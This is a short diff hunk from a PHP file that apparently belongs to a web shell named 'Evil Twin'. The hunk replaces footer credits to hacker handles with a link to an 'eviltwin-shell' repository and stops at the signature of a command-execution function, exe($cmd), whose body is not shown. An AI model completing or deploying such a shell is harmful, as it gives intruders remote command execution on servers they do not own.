@@ -390,7 +390,7 @@ echo '</center></td>
 echo '</table>
 </div>';
 }
-echo "<br><center><a href='mailto:zsecode@yandex.com'>Sec666host</a> <font color=#C7C7C7>X</font> <a href='mailto:syndrome.patah.hati@gmail.com'>Fadly31337</a></center>
+echo "<br><center><a href='https://github.com/eviltwin-dev/eviltwin-shell'>&copy; Evil Twin</a></center>
 </body>
 </html>";
 function exe($cmd) { 	
